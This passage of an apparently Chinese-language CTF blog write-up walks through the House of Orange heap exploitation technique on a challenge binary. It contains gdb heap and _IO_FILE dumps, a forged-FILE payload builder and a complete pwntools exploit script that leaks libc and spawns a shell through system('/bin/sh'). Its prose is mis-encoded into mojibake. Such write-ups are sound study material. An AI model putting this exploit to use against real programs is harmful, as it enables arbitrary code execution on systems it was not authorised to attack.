bin</code>ä¸­å¿…ç„¶æ˜¯ç©ºé—²çš„ï¼Œæ‰€ä»¥å…¶å‰ä¸€ä¸ªå¿…ç„¶åœ¨ä½¿ç”¨ä¸­ï¼‰ï¼Œé‚£ä¹ˆå½“å…¶åŠ å…¥<code>smallbin</code>ä¸­å°±ä¼šåŠ å…¥åˆ°<code>bins[6]</code>ï¼Œè¿™æ ·å°±èƒ½å®ç°<code>fp=top</code>ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ§åˆ¶çš„ä½ç½®äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55555577a010 (size : 0x20ff0)</span><br><span class="line">       last_remainder: 0x555555758570 (size : 0x60)</span><br><span class="line">            unsortbin: 0x555555758570 (size : 0x60)</span><br><span class="line">(0x060)  smallbin[ 4]: 0x555555758570 (overlap chunk with 0x555555758570(freed) )</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ </p><p>fpâ€”&gt; chainâ€”&gt; 0x555555758570</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fp <span class="number">0x2aaaab097b78</span></span><br><span class="line">$<span class="number">18</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x5577a010</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x555555758570</span> <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x555555758570</span> <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab098510</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x2aaaab097b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;p\205uUUU&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x2aaaab097b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;p\205uUUU&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x2aaaab097b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x2aaaab097b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x2aaaab097ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x2aaaab097ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x2aaaab097bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x2aaaab097bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x555555758570</span>,</span><br><span class="line">    _chain = <span class="number">0x555555758570</span>,</span><br><span class="line">    _fileno = <span class="number">0xab097bd8</span>,</span><br><span class="line">    _flags2 = <span class="number">0x2aaa</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaab097bd8</span>,</span><br><span class="line">    _cur_column = <span class="number">0x7be8</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x9</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\253&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x2aaaab097be8</span> &lt;main_arena+<span class="number">200</span>&gt;,</span><br><span class="line">    _offset = <span class="number">0x2aaaab097bf8</span>,</span><br><span class="line">    _codecvt = <span class="number">0x2aaaab097bf8</span> &lt;main_arena+<span class="number">216</span>&gt;,</span><br><span class="line">    _wide_data = <span class="number">0x2aaaab097c08</span> &lt;main_arena+<span class="number">232</span>&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x2aaaab097c08</span> &lt;main_arena+<span class="number">232</span>&gt;,</span><br><span class="line">    _freeres_buf = <span class="number">0x2aaaab097c18</span> &lt;main_arena+<span class="number">248</span>&gt;,</span><br><span class="line">    __pad5 = <span class="number">0x2aaaab097c18</span>,</span><br><span class="line">    _mode = <span class="number">0xab097c28</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\252*\000\000(|\t\253\252*\000\000\070|\t\253\252*\000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x2aaaab097c38</span> &lt;main_arena+<span class="number">280</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ fp <span class="number">0x555555758570</span></span><br><span class="line">$<span class="number">19</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x6e69622f</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0x0</span>,</span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaaad18390</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x0</span>,</span><br><span class="line">    _offset = <span class="number">0x0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x555555758600</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x2</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x3</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0xffffffff</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x5555557585d0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€äº›æ¡ä»¶çš„bypass</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">â€¦</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)ã€€ã€€</span><br></pre></td></tr></table></figure><p>æ¡ä»¶æ€»ç»“å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.fp-&gt;_mode &lt;= 0</span><br><span class="line">2.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">æˆ–</span><br><span class="line">1._IO_vtable_offset (fp) == 0</span><br><span class="line">2.fp-&gt;_mode &gt; 0</span><br><span class="line">3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥é€‰æ‹©ç¬¬ä¸€ç§æ„é€ æ¡ä»¶ç®€å•çš„è¿›è¡Œæ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange</span>(<span class="params">head_addr, system_addr, io_list_all</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload + p64(<span class="number">97</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">16</span>)</span><br><span class="line">    payload = payload + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">9</span> + p64(system_addr) + p64(<span class="number">0</span></span><br><span class="line">        ) * <span class="number">4</span></span><br><span class="line">    payload = payload + p64(head_addr + <span class="number">18</span> * <span class="number">8</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0</span></span><br><span class="line">        ) + p64(<span class="number">18446744073709551615</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(head_addr + <span class="number">12</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>æ„é€ ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fp <span class="number">0x555555758570</span></span><br><span class="line">$<span class="number">20</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x6e69622f</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0x0</span>,</span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaaad18390</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x0</span>,</span><br><span class="line">    _offset = <span class="number">0x0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x555555758600</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x2</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x3</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0xffffffff</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x5555557585d0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> swpwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&#x27;./houseoforange&#x27;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(binary, aslr = <span class="number">0</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.terminal = [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;notiterm.py&quot;</span>,<span class="string">&quot;-t&quot;</span>,<span class="string">&quot;iterm&quot;</span>,<span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">myu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange</span>(<span class="params">head_addr, system_addr, io_list_all</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload + p64(<span class="number">97</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">16</span>)</span><br><span class="line">    payload = payload + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">9</span> + p64(system_addr) + p64(<span class="number">0</span></span><br><span class="line">        ) * <span class="number">4</span></span><br><span class="line">    payload = payload + p64(head_addr + <span class="number">18</span> * <span class="number">8</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0</span></span><br><span class="line">        ) + p64(<span class="number">18446744073709551615</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(head_addr + <span class="number">12</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">nm, length, pz, color</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(pz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span>(<span class="params">nm, length, pz, color</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.send(nm)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(pz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(color))</span><br><span class="line">breakpoint = [<span class="number">0x01415</span>,<span class="number">0x13FD</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">break *0x555555554000+0x01415</span></span><br><span class="line"><span class="string">break *0x555555554000+0x13FD </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">build(<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>, <span class="number">0x90</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x90</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>) + p32(<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf21</span>)</span><br><span class="line"><span class="comment"># overwrite the top chunk</span></span><br><span class="line">pause()</span><br><span class="line">upgrade(pay, len(pay), <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger _int_free()</span></span><br><span class="line">build(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># build a large chunk</span></span><br><span class="line">build(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3bd000</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc.address) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap with fd_nextsize, bk_nextsize</span></span><br><span class="line">upgrade(<span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;2&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = myu64(io.recvn(<span class="number">6</span>)) - <span class="number">0x140</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(heap_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     break *0x555555554000+0x13FD </span></span><br><span class="line"><span class="comment">#     break *0x555555554000+0x01415</span></span><br><span class="line"><span class="comment">#     &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0x1f</span>) + p32(<span class="number">0x1</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stream = house_of_orange(<span class="number">0x555555758570</span>,libc.symbols[<span class="string">&#x27;system&#x27;</span>],libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># stream = &#x27;/bin/sh\0&#x27; + p64(0x61)</span></span><br><span class="line"><span class="comment"># stream += p64(0) + p64(libc.symbols[&#x27;_IO_list_all&#x27;] - 0x10)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stream = stream.ljust(0xa0, &#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># ## fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment"># stream += p64(heap_addr + 0x610)</span></span><br><span class="line"><span class="comment"># stream = stream.ljust(0xc0, &#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># stream += p64(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pay += stream</span></span><br><span class="line"><span class="comment"># pay += p64(0) * 2</span></span><br><span class="line"><span class="comment"># ## vtable</span></span><br><span class="line"><span class="comment"># pay += p64(heap_addr + 0x668)</span></span><br><span class="line"><span class="comment"># pay += p64(0) * 6</span></span><br><span class="line"><span class="comment"># pay += p64(libc.symbols[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">pay += stream</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">upgrade(pay, <span class="number">0x800</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-houseoforange-glibc-2-24-bypass"><a href="#0x03-houseoforange-glibc-2-24-bypass" class="headerlink" 